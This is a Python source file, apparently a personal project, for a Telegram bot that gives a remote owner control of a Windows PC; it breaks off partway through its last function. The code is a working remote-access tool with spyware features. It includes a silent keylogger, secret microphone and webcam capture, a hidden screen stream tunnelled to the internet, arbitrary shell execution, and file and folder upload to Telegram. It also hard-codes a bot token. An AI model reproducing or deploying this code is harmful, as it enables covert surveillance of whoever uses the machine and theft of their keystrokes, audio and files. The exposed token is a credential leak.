import sys
import os
if len(sys.argv) > 1 and sys.argv[1] == "--stream-server":
    from flask import Flask, Response
    import pyautogui
    import cv2
    import numpy as np
    import time
    import logging

    app_stream = Flask(__name__)

    def generate_frames():
        while True:
            try:
                img = pyautogui.screenshot()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                ret, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                frame = buffer.tobytes()
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
                time.sleep(0.1)
            except Exception:
                pass

    @app_stream.route('/')
    def video_feed():
        return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    app_stream.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
    sys.exit(0)

def setup_logging():
    try:
        if getattr(sys, 'frozen', False):
            base_dir = os.path.dirname(sys.executable)
        else:
            base_dir = os.path.dirname(os.path.abspath(__file__))
        log_path = os.path.join(base_dir, "bot_error.log")
        f = open(log_path, "a", encoding="utf-8")
        sys.stdout = f
        sys.stderr = f
    except Exception:
        pass
        
    if sys.stdout is None:
        sys.stdout = open(os.devnull, "w")
    if sys.stderr is None:
        sys.stderr = open(os.devnull, "w")

setup_logging()

import tempfile
import os
TEMP_DIR = tempfile.gettempdir()

import psutil
import pyautogui
import pynput
import traceback

def log_uncaught_exceptions(ex_cls, ex, tb):
    with open(os.path.join(TEMP_DIR, "bot_fatal_crash.txt"), "w") as f:
        f.write(''.join(traceback.format_tb(tb)))
        f.write('{0}: {1}'.format(ex_cls, ex))

sys.excepthook = log_uncaught_exceptions

import asyncio
import cv2
import ctypes
import pyperclip
import pyttsx3
import subprocess
import socket
import time
import numpy as np
import threading
import httpx
from plyer import notification
import telegram.error
from telegram import Update, Document, PhotoSize
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import shutil
import yt_dlp
import sounddevice as sd
import soundfile as sf
import keyboard

# Your Bot Token from BotFather
TOKEN = "8980284332:AAEo8LPw92CvcbbT4ut6yhoqNwgWlqLzBGU"
ALLOWED_USERNAME = "saimaniippili"  

jiggle_task = None
is_jiggling = False

livestream_task = None
is_livestreaming = False

is_keylogging = False
keylog_buffer = ""

current_dir = os.path.expanduser("~")
is_bt_locking = False
bt_device_name = ""

stream_process = None
tunnel_process = None

async def check_auth(update: Update) -> bool:
    username = update.effective_user.username
    if username != ALLOWED_USERNAME:
        await update.message.reply_text("⛔ Unauthorized access. This bot belongs to @saimaniippili.")
        return False
        
    # Save chat ID so the bot can message you on startup
    chat_id = update.effective_chat.id
    with open(os.path.join(os.path.dirname(__file__), "chat_id.txt"), "w") as f:
        f.write(str(chat_id))
        
    return True

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_auth(update):
        await update.message.reply_text(
            "W laptop connected! 👑\n\n"
            "**ULTIMATE COMMAND CENTER**\n\n"
            "🛡️ **Security & Spying**\n"
            "/intruder - Anti-theft! Lock PC, snap webcam, record audio 🚨\n"
            "/keylog [on/off] - Silently record all keystrokes 🕵️‍♂️\n"
            "/mic [seconds] - Secretly record microphone audio 🎤\n"
            "/bluetooth [name] - Auto-lock PC if phone disconnects 🔓\n\n"
            "💻 **System & Hacking**\n"
            "/type [text] - Ghost type text on the screen ⌨️\n"
            "/key [keys] - Execute shortcuts (e.g. /key win+d) ⌨️\n"
            "/tasks - List heavy apps and kill them with /kill [PID] 🎯\n"
            "/livescreen [on/off] - Send screenshots every 5s 🟢\n"
            "/stream [on/off] - Live HD Video Stream (Local WiFi) 🎥\n"
            "/location - Pinpoint Hardware GPS location 📍\n"
            "/jiggle - Anti-sleep WakeLock 🖱️\n\n"
            "📁 **Files & Media**\n"
            "*(Send YouTube/Twitter links to auto-download MP4s!)*\n"
            "/ls & /cd [dir] - Interactive file explorer 📂\n"
            "/get [path] - Download file to phone 📥\n"
            "/backup [folder] - Zip and download whole folders 🗂️\n"
            "/open [app/url] - Open app or website 🚀\n"
            "/close [app] - Close an app ❌\n\n"
            "🎵 **Media**\n"
            "/play, /pause, /next, /prev, /volup, /voldown, /mute\n\n"
            "⚙️ **Basics**\n"
            "/screenshot, /webcam, /record, /stats, /lock, /restart\n"
        )

# --- SYSTEM COMMANDS ---

async def screenshot_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    await update.message.reply_text("Taking screenshot... 📸")
    screenshot_path = os.path.join(TEMP_DIR, "screenshot.png")
    try:
        try:
            pyautogui.screenshot(screenshot_path)
        except Exception:
            from PIL import ImageGrab
            im = ImageGrab.grab(all_screens=False)
            im.save(screenshot_path)
        with open(screenshot_path, "rb") as photo:
            await update.message.reply_photo(photo)
        if os.path.exists(screenshot_path):
            os.remove(screenshot_path)
    except Exception as e:
        await update.message.reply_text(f"❌ Screenshot failed: {e}")

async def webcam_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    await update.message.reply_text("Turning on webcam... 🤳")
    
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        await update.message.reply_text("❌ Could not access webcam.")
        return
        
    ret, frame = cap.read()
    cap.release()
    
    if ret:
        cv2.imwrite(os.path.join(TEMP_DIR, "webcam.jpg"), frame)
        with open(os.path.join(TEMP_DIR, "webcam.jpg"), "rb") as photo:
            await update.message.reply_photo(photo)
        os.remove(os.path.join(TEMP_DIR, "webcam.jpg"))
    else:
        await update.message.reply_text("❌ Failed to capture image.")

def record_worker(duration, filename):
    screen_size = tuple(pyautogui.size())
    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
    out = cv2.VideoWriter(filename, fourcc, 10.0, screen_size)
    
    start_time = time.time()
    while time.time() - start_time < duration:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
        out.write(frame)
        
    out.release()

async def record_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    
    duration = 10  # default
    if context.args:
        try:
            duration = int(context.args[0])
            if duration > 60:
                await update.message.reply_text("⚠️ Maximum recording time is 60 seconds.")
                duration = 60
        except ValueError:
            await update.message.reply_text("❌ Please provide a valid number of seconds. Example: /record 15")
            return
            
    await update.message.reply_text(f"🎥 Recording screen for {duration} seconds... Please wait.")
    
    filename = os.path.join(TEMP_DIR, "screen_record.mp4")
    # Run the blocking recording in a separate thread so bot doesn't freeze
    thread = threading.Thread(target=record_worker, args=(duration, filename))
    thread.start()
    
    # Wait for the thread to finish asynchronously
    while thread.is_alive():
        await asyncio.sleep(1)
        
    if os.path.exists(filename):
        await update.message.reply_text("✅ Recording finished! Uploading...")
        with open(filename, "rb") as video:
            await update.message.reply_video(video)
        os.remove(filename)
    else:
        await update.message.reply_text("❌ Failed to record screen.")

async def livescreen_loop(update, context):
    global is_livestreaming
    while is_livestreaming:
        try:
            screenshot_path = os.path.join(TEMP_DIR, "live_screen.png")
            try:
                pyautogui.screenshot(screenshot_path)
            except Exception:
                from PIL import ImageGrab
                im = ImageGrab.grab(all_screens=False)
                im.save(screenshot_path)
            with open(screenshot_path, "rb") as photo:
                await update.message.reply_photo(photo)
            if os.path.exists(screenshot_path):
                os.remove(screenshot_path)
        except Exception:
            pass
        await asyncio.sleep(5)

async def livescreen_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    global is_livestreaming, livestream_task
    
    command = "on" if not context.args else context.args[0].lower()
    
    if command == "on":
        if is_livestreaming:
            await update.message.reply_text("⚠️ Live screen is already running!")
            return
        is_livestreaming = True
        livestream_task = asyncio.create_task(livescreen_loop(update, context))
        await update.message.reply_text("🟢 Live screen STARTED! Sending a screenshot every 5 seconds. Type `/livescreen off` to stop.")
    elif command == "off":
        if not is_livestreaming:
            await update.message.reply_text("⚠️ Live screen is not currently running.")
            return
        is_livestreaming = False
        if livestream_task:
            livestream_task.cancel()
        await update.message.reply_text("🔴 Live screen STOPPED.")
    else:
        await update.message.reply_text("Usage: `/livescreen on` or `/livescreen off`")

async def stream_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    global stream_process, tunnel_process
    
    command = "on" if not context.args else context.args[0].lower()
    
    if command == "on":
        if stream_process and stream_process.poll() is None:
            await update.message.reply_text("⚠️ Stream is already running!")
            return
            
        await update.message.reply_text("⏳ Initializing live stream & global tunnels. Please wait...")
        # Start the internal stream server router
        stream_process = subprocess.Popen([sys.executable, "--stream-server"], creationflags=subprocess.CREATE_NO_WINDOW)
        
        # Start Localtunnel for global access in a background thread
        def start_tunnel():
            global tunnel_process
            tunnel_process = subprocess.Popen(
                "npx -y localtunnel --port 5000",
                shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, creationflags=subprocess.CREATE_NO_WINDOW
            )
            import queue
            import threading
            
            def enqueue_output(out, q):
                for line in iter(out.readline, ''):
                    q.put(line)
                out.close()
                
            q = queue.Queue()
            t = threading.Thread(target=enqueue_output, args=(tunnel_process.stdout, q))
            t.daemon = True
            t.start()
            
            for _ in range(15):
                try:
                    while True:
                        line = q.get_nowait()
                        if "your url is:" in line:
                            return line.split("your url is:")[1].strip()
                except queue.Empty:
                    time.sleep(1)
            return None
            
        global_url = await asyncio.to_thread(start_tunnel)
        
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        msg = f"🎥 **LIVE STREAM STARTED**\n\n"
        if global_url:
            msg += f"🌍 **Global Link (Anywhere in the world!):**\n{global_url}\n*(Note: You will see a warning page. Click the 'Click to Continue' button to view the video feed.)*\n\n"
        msg += f"🏠 **Local Link (Same Wi-Fi only):**\nhttp://{local_ip}:5000/\n\n*(Type `/stream off` to stop)*"
        
        await update.message.reply_text(msg, parse_mode="Markdown")
        
    elif command == "off":
        if stream_process:
            stream_process.terminate()
            stream_process = None
        if tunnel_process:
            tunnel_process.terminate()
            tunnel_process = None
        await update.message.reply_text("🔴 Live stream STOPPED.")
    else:
        await update.message.reply_text("Usage: `/stream on` or `/stream off`")

async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    
    cpu = psutil.cpu_percent(interval=1)
    ram = psutil.virtual_memory().percent
    
    battery_info = ""
    if hasattr(psutil, "sensors_battery"):
        battery = psutil.sensors_battery()
        if battery:
            plugged = "🔌 Plugged In" if battery.power_plugged else "🔋 On Battery"
            battery_info = f"\nBattery: {battery.percent}% ({plugged})"
            
    stats_msg = f"🖥️ **System Stats:**\nCPU Usage: {cpu}%\nRAM Usage: {ram}%{battery_info}"
    await update.message.reply_text(stats_msg)

async def location_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    await update.message.reply_text("🛰️ Activating Windows Hardware GPS to pinpoint location...")
    
    try:
        from winsdk.windows.devices.geolocation import Geolocator, GeolocationAccessStatus
        
        status = await Geolocator.request_access_async()
        
        if status == GeolocationAccessStatus.ALLOWED:
            geolocator = Geolocator()
            
            # This fetches the location (can take a few seconds to triangulate)
            pos = await geolocator.get_geoposition_async()
            
            lat = pos.coordinate.point.position.latitude
            lon = pos.coordinate.point.position.longitude
            accuracy = pos.coordinate.accuracy
            
            # Send the native Telegram location map
            await update.message.reply_location(latitude=lat, longitude=lon)
            await update.message.reply_text(f"📍 **Precise Hardware Location:**\n*(Accuracy: {accuracy} meters)*", parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ Location access was denied by Windows. Please check Privacy Settings.")
            
    except ImportError:
        await update.message.reply_text("❌ `winsdk` module is not installed.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error getting hardware location: {e}")

async def lock_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    await update.message.reply_text("Locking PC... 🔒")
    ctypes.windll.user32.LockWorkStation()
    await update.message.reply_text("✅ PC is locked.")

async def shutdown_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    await update.message.reply_text("Initiating shutdown sequence in 10 seconds... 📉")
    os.system("shutdown /s /t 10")

async def restart_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    await update.message.reply_text("Initiating PC restart in 10 seconds... 🔄")
    os.system("shutdown /r /t 10")


# --- APPS & FILES ---

def launch_visible(path):
    # 1 = SW_SHOWNORMAL. This completely ignores the hidden background state of the bot 
    # and forces the application to open fully visible on the user's screen!
    ctypes.windll.shell32.ShellExecuteW(None, "open", path, None, None, 1)

async def open_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    if not context.args:
        await update.message.reply_text("Usage: /open [app name]\nExample: /open spotify")
        return
    
    app_name = " ".join(context.args)
    await update.message.reply_text(f"🔍 Locating '{app_name}' on your system...")
    
    try:
        # 1. Try URL / website directly
        if app_name.startswith("http") or app_name.endswith(".com"):
            launch_visible(app_name)
            await update.message.reply_text(f"✅ Opened URL '{app_name}'.")
            return
            
        # 2. Try common system aliases explicitly
        aliases = {
            "calculator": "calc", "calc": "calc",
            "notepad": "notepad", "cmd": "cmd",
            "camera": "microsoft.windows.camera:",
            "settings": "ms-settings:", "spotify": "spotify",
            "vlc": "vlc", "chrome": "chrome", "edge": "msedge"
        }
        
        if app_name.lower() in aliases:
            launch_visible(aliases[app_name.lower()])
            await update.message.reply_text(f"✅ Opened '{app_name}' via system alias.")
            return
            
        # 3. Deep search Windows Start Menu directories for the shortcut (.lnk)
        search_dirs = [
            os.path.expandvars(r"%ProgramData%\Microsoft\Windows\Start Menu\Programs"),
            os.path.expandvars(r"%AppData%\Microsoft\Windows\Start Menu\Programs")
        ]
        
        for directory in search_dirs:
            for root, dirs, files in os.walk(directory):
                for file in files:
                    if file.endswith(".lnk") and app_name.lower() in file.lower():
                        filepath = os.path.join(root, file)
                        launch_visible(filepath)
                        await update.message.reply_text(f"✅ Found and opened shortcut for '{app_name}'.")
                        return
                        
        # 4. Fallback to generic start
        launch_visible(app_name)
        await update.message.reply_text(f"✅ Executed generic launch for '{app_name}'.")
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error opening app: {e}")

async def close_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    if not context.args:
        await update.message.reply_text("Usage: /close [app_name]\nExample: /close chrome")
        return
    
    app_name = " ".join(context.args).lower()
    closed = False
    
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'] and app_name in proc.info['name'].lower():
                proc.kill()
                closed = True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    
    if closed:
        await update.message.reply_text(f"✅ Closed {app_name}")
    else:
        await update.message.reply_text(f"❌ Could not find {app_name} running.")

async def get_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    if not context.args:
        await update.message.reply_text("Usage: /get [absolute path to file]\nExample: /get C:\\Users\\smipp\\Desktop\\file.txt")
        return
    
    file_path = " ".join(context.args)
    if os.path.exists(file_path) and os.path.isfile(file_path):
        await update.message.reply_text("📥 Uploading to Telegram...")
        with open(file_path, "rb") as file:
            await update.message.reply_document(file)
    else:
        await update.message.reply_text(f"❌ File not found at: {file_path}")

async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    
    try:
        file_obj = None
        file_name = None
        
        # Check what kind of media was sent
        if update.message.document:
            file_obj = await context.bot.get_file(update.message.document.file_id)
            file_name = update.message.document.file_name
        elif update.message.photo:
            file_obj = await context.bot.get_file(update.message.photo[-1].file_id)
            file_name = f"photo_{int(time.time())}.jpg"
        elif update.message.video:
            file_obj = await context.bot.get_file(update.message.video.file_id)
            file_name = update.message.video.file_name or f"video_{int(time.time())}.mp4"
        elif update.message.audio:
            file_obj = await context.bot.get_file(update.message.audio.file_id)
            file_name = update.message.audio.file_name or f"audio_{int(time.time())}.mp3"
        elif update.message.voice:
            file_obj = await context.bot.get_file(update.message.voice.file_id)
            file_name = f"voice_{int(time.time())}.ogg"
            
        if file_obj:
            download_dir = os.path.join(os.path.expanduser('~'), 'Downloads')
            if not file_name:
                file_name = f"file_{int(time.time())}"
                
            file_path = os.path.join(download_dir, file_name)
            
            # If file exists, append timestamp to make it unique
            if os.path.exists(file_path):
                name, ext = os.path.splitext(file_name)
                file_name = f"{name}_{int(time.time())}{ext}"
                file_path = os.path.join(download_dir, file_name)
                
            await update.message.reply_text(f"📥 Downloading `{file_name}`...", parse_mode="Markdown")
            await file_obj.download_to_drive(file_path)
            await update.message.reply_text(f"✅ Download complete! Saved directly to:\n`{file_path}`", parse_mode="Markdown")
            
    except telegram.error.BadRequest as e:
        if "File is too big" in str(e):
            await update.message.reply_text("❌ Download failed: File exceeds Telegram's 20MB limit for bots.")
        else:
            await update.message.reply_text(f"❌ Error downloading file: {e}")
    except Exception as e:
        await update.message.reply_text(f"❌ Unexpected error downloading file: {e}")

# --- MEDIA CONTROLS ---

async def media_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    command = update.message.text.split()[0].lower()
    
    if command == '/play' or command == '/pause':
        pyautogui.press('playpause')
        await update.message.reply_text("⏯️ Play/Pause toggled.")
    elif command == '/next':
        pyautogui.press('nexttrack')
        await update.message.reply_text("⏭️ Next track.")
    elif command == '/prev':
        pyautogui.press('prevtrack')
        await update.message.reply_text("⏮️ Previous track.")
    elif command == '/volup':
        pyautogui.press('volumeup', presses=5)
        await update.message.reply_text("🔊 Volume increased.")
    elif command == '/voldown':
        pyautogui.press('volumedown', presses=5)
        await update.message.reply_text("🔉 Volume decreased.")
    elif command == '/mute':
        pyautogui.press('volumemute')
        await update.message.reply_text("🔇 Mute toggled.")

# --- EXTRAS & HACKS ---

async def toast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    if not context.args:
        await update.message.reply_text("Usage: /toast [message]")
        return
    
    message = " ".join(context.args)
    notification.notify(title="Telegram Message", message=message, timeout=5)
    await update.message.reply_text("🔔 Toast notification sent!")

async def clip_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    
    if context.args:
        # Set clipboard
        new_text = " ".join(context.args)
        pyperclip.copy(new_text)
        await update.message.reply_text("📋 Text copied to laptop clipboard!")
    else:
        # Get clipboard
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            await update.message.reply_text(f"📋 Current laptop clipboard:\n\n{clipboard_text}")
        else:
            await update.message.reply_text("📋 Clipboard is empty.")

def speak_worker(text):
    engine = pyttsx3.init()
    engine.say(text)
    engine.runAndWait()

async def speak_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    if not context.args:
        await update.message.reply_text("Usage: /speak [message]")
        return
    
    text = " ".join(context.args)
    threading.Thread(target=speak_worker, args=(text,)).start()
    await update.message.reply_text(f"🗣️ Speaking: '{text}'")

async def cmd_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    if not context.args:
        await update.message.reply_text("Usage: /cmd [terminal command]")
        return
    
    cmd = " ".join(context.args)
    await update.message.reply_text(f"💻 Running: `{cmd}`", parse_mode="Markdown")
    
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
        output_text = output.decode('utf-8', errors='ignore')
        
        # Telegram has a 4096 character limit
        if len(output_text) > 4000:
            output_text = output_text[:4000] + "\n...[TRUNCATED]"
            
        await update.message.reply_text(f"```\n{output_text}\n```", parse_mode="Markdown")
    except subprocess.TimeoutExpired:
        await update.message.reply_text("❌ Command timed out after 10 seconds.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error:\n```\n{e}\n```", parse_mode="Markdown")

async def intruder_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    await update.message.reply_text("🚨 INTRUDER MODE ACTIVATED 🚨\nLocking PC and capturing evidence...")
    
    # 1. Lock PC
    ctypes.windll.user32.LockWorkStation()
    
    # 2. Capture Webcam
    cap = cv2.VideoCapture(0)
    if cap.isOpened():
        ret, frame = cap.read()
        cap.release()
        if ret:
            cv2.imwrite(os.path.join(TEMP_DIR, "intruder.jpg"), frame)
            with open(os.path.join(TEMP_DIR, "intruder.jpg"), "rb") as f:
                await update.message.reply_photo(f, caption="📸 Intruder Webcam Capture")
            os.remove(os.path.join(TEMP_DIR, "intruder.jpg"))
            
    # 3. Capture Audio
    try:
        fs = 44100
        duration = 10
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
        sd.wait()
        sf.write(os.path.join(TEMP_DIR, "intruder.wav"), recording, fs)
        with open(os.path.join(TEMP_DIR, "intruder.wav"), "rb") as f:
            await update.message.reply_voice(f, caption="🎙️ Intruder Audio Capture")
        os.remove(os.path.join(TEMP_DIR, "intruder.wav"))
    except Exception as e:
        await update.message.reply_text(f"❌ Audio capture failed: {e}")

def keylogger_callback(event):
    global keylog_buffer
    if event.event_type == keyboard.KEY_DOWN:
        if len(event.name) == 1:
            keylog_buffer += event.name
        elif event.name == "space":
            keylog_buffer += " "
        elif event.name == "enter":
            keylog_buffer += "\n"
        else:
            keylog_buffer += f"[{event.name}]"
        
        if len(keylog_buffer) > 1000:
            with open(os.path.join(TEMP_DIR, "keylog.txt"), "a") as f:
                f.write(keylog_buffer)
            keylog_buffer = ""

async def keylog_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    global is_keylogging, keylog_buffer
    command = "on" if not context.args else context.args[0].lower()
    
    if command == "on":
        if is_keylogging:
            await update.message.reply_text("⚠️ Keylogger is already running.")
            return
        is_keylogging = True
        keyboard.hook(keylogger_callback)
        await update.message.reply_text("🕵️‍♂️ Keylogger ON. Recording all keystrokes silently.")
    elif command == "off":
        if not is_keylogging:
            return
        is_keylogging = False
        keyboard.unhook_all()
        if keylog_buffer:
            with open(os.path.join(TEMP_DIR, "keylog.txt"), "a") as f:
                f.write(keylog_buffer)
            keylog_buffer = ""
        
        if os.path.exists(os.path.join(TEMP_DIR, "keylog.txt")):
            with open(os.path.join(TEMP_DIR, "keylog.txt"), "rb") as f:
                await update.message.reply_document(f, caption="📜 Keylog dump")
            os.remove(os.path.join(TEMP_DIR, "keylog.txt"))
        else:
            await update.message.reply_text("📜 Keylog stopped. No keys were pressed.")

async def ls_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    global current_dir
    
    if context.args:
        target = " ".join(context.args)
        if os.path.isdir(target):
            current_dir = target
        else:
            await update.message.reply_text("❌ Not a valid directory.")
            return

    try:
        items = os.listdir(current_dir)
        folders = [f for f in items if os.path.isdir(os.path.join(current_dir, f))][:25]
        files = [f for f in items if os.path.isfile(os.path.join(current_dir, f))][:25]
        
        msg = f"📂 **Current Directory:**\n`{current_dir}`\n\n"
        if folders:
            msg += "📁 **Folders:**\n" + "\n".join(f"`/cd {f}`" for f in folders) + "\n\n"
        if files:
            msg += "📄 **Files:**\n" + "\n".join(f"`/get {os.path.join(current_dir, f)}`" for f in files)
            
        await update.message.reply_text(msg[:4000], parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def cd_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    global current_dir
    if not context.args:
        current_dir = os.path.expanduser("~")
    elif context.args[0] == "..":
        current_dir = os.path.dirname(current_dir)
    else:
        target = " ".join(context.args)
        full_path = os.path.join(current_dir, target)
        if os.path.isdir(full_path):
            current_dir = full_path
        else:
            await update.message.reply_text("❌ Directory not found.")
            return
            
    await ls_cmd(update, context)

async def bt_loop(update, context):
    global is_bt_locking, bt_device_name
    while is_bt_locking:
        try:
            cmd = f"Get-PnpDevice -Class Bluetooth -Status OK | Select-Object -ExpandProperty FriendlyName"
            output = subprocess.check_output(["powershell", "-Command", cmd], text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            if bt_device_name.lower() not in output.lower():
                ctypes.windll.user32.LockWorkStation()
                await update.message.reply_text(f"🔒 Bluetooth device '{bt_device_name}' disconnected! PC LOCKED.")
                while is_bt_locking:
                    out2 = subprocess.check_output(["powershell", "-Command", cmd], text=True, creationflags=subprocess.CREATE_NO_WINDOW)
                    if bt_device_name.lower() in out2.lower():
                        await update.message.reply_text(f"🔓 Bluetooth device '{bt_device_name}' reconnected! (You must manually unlock Windows)")
                        break
                    await asyncio.sleep(10)
        except Exception:
            pass
        await asyncio.sleep(10)

async def bluetooth_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    global is_bt_locking, bt_device_name
    
    if not context.args:
        await update.message.reply_text("Usage: `/bluetooth [Device Name]` to start, or `/bluetooth off` to stop.\nExample: `/bluetooth Saimani iPhone`", parse_mode="Markdown")
        return
        
    command = " ".join(context.args)
    if command.lower() == "off":
        is_bt_locking = False
        await update.message.reply_text("🛑 Bluetooth Proximity Lock STOPPED.")
    else:
        bt_device_name = command
        is_bt_locking = True
        asyncio.create_task(bt_loop(update, context))
        await update.message.reply_text(f"🛡️ Bluetooth Proximity Lock ON!\nMonitoring for: `{bt_device_name}`\nIf this device disconnects, the PC will auto-lock.", parse_mode="Markdown")

async def type_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    if not context.args: return
    text = " ".join(context.args)
    pyautogui.write(text, interval=0.01)
    await update.message.reply_text(f"⌨️ Typed: {text}")

async def key_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    if not context.args: return
    keys = " ".join(context.args).split("+")
    pyautogui.hotkey(*[k.strip() for k in keys])
    await update.message.reply_text(f"⌨️ Executed shortcut: {' + '.join(keys)}")

async def tasks_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    await update.message.reply_text("📊 Scanning processes...")
    
    processes = []
    for p in psutil.process_iter(['pid', 'name', 'memory_percent']):
        try:
            processes.append(p.info)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
            
    processes = sorted(processes, key=lambda x: x['memory_percent'] or 0, reverse=True)[:10]
    
    msg = "🔥 **Top 10 Heavy Apps:**\n\n"
    for p in processes:
        mem = (p['memory_percent'] or 0)
        msg += f"`{p['pid']}` - {p['name']} ({mem:.1f}% RAM)\n"
        
    msg += "\n*Reply with `/kill PID` to terminate an app.*"
    await update.message.reply_text(msg, parse_mode="Markdown")

async def kill_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    if not context.args: return
    
    try:
        pid = int(context.args[0])
        p = psutil.Process(pid)
        name = p.name()
        p.terminate()
        await update.message.reply_text(f"✅ Killed process `{pid}` ({name})", parse_mode="Markdown")
    except ValueError:
        await update.message.reply_text("❌ Please provide a valid numeric PID.")
    except Exception as e:
        await update.message.reply_text(f"❌ Could not kill {context.args[0]}: {e}")

async def backup_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    if not context.args: return
    
    folder = " ".join(context.args)
    if not os.path.exists(folder) or not os.path.isdir(folder):
        await update.message.reply_text("❌ Directory not found.")
        return
        
    await update.message.reply_text(f"🗂️ Compressing folder: `{folder}`\nPlease wait...", parse_mode="Markdown")
    
    zip_path = folder + "_backup.zip"
    try:
        shutil.make_archive(folder + "_backup", 'zip', folder)
        size_mb = os.path.getsize(zip_path) / (1024 * 1024)
        
        await update.message.reply_text(f"✅ Backup created! Size: {size_mb:.1f} MB.")
        if size_mb <= 20:
            with open(zip_path, "rb") as f:
                await update.message.reply_document(f)
        else:
            await update.message.reply_text("⚠️ File is larger than 20MB, so it was saved to the PC but cannot be uploaded to Telegram.")
    except Exception as e:
        await update.message.reply_text(f"❌ Backup failed: {e}")

async def mic_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    duration = 5
    if context.args:
        try:
            duration = int(context.args[0])
        except ValueError: pass
        
    await update.message.reply_text(f"🎤 Secretly recording {duration} seconds of audio...")
    
    try:
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
        sd.wait()
        
        filename = "secret_audio.wav"
        sf.write(filename, recording, fs)
        
        with open(filename, "rb") as f:
            await update.message.reply_voice(f)
        os.remove(filename)
    except Exception as e:
        await update.message.reply_text(f"❌ Recording failed: {e}")

async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    text = update.message.text
    
    urls = [word for word in text.split() if "http" in word]
    for url in urls:
        if any(domain in url for domain in ["youtube.com", "youtu.be", "instagram.com/reel", "twitter.com", "x.com"]):
            await update.message.reply_text(f"🎬 Media link detected! Downloading HD MP4...")
            
            def download_video():
                try:
                    download_dir = os.path.join(os.path.expanduser('~'), 'Downloads')
                    ydl_opts = {
                        'outtmpl': os.path.join(download_dir, '%(title)s.%(ext)s'),
                        'format': 'bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best',
                        'quiet': True,
                        'no_warnings': True
                    }
                    with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                        ydl.download([url])
                    return True, None
                except Exception as e:
                    return False, str(e)
                    
            success, err = await asyncio.to_thread(download_video)
            if success:
                await update.message.reply_text("✅ Video successfully downloaded to your PC's Downloads folder!")
            else:
                await update.message.reply_text(f"❌ Failed to download video: {err}")

async def jiggle_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update): return
    global is_jiggling
    
    # Windows API constants for preventing sleep
    ES_CONTINUOUS = 0x80000000
    ES_SYSTEM_REQUIRED = 0x00000001
